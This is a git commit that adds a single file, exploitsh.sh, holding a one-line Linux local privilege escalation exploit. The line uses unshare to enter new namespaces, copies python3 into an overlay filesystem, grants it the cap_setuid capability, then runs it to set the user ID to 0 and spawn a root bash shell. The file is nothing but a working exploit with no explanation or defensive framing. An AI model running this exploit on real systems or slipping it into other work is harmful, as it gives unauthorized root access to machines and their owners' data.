ee01c586cc93d580e8f203c5ab4c0bbde436148c
spec3Ace <127269737+acesoyeo@users.noreply.github.com>
2024-02-19 17:54:02 -0800

    Add files via upload

---
+++ exploitsh.sh
@@ -0,0 +1,1 @@
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
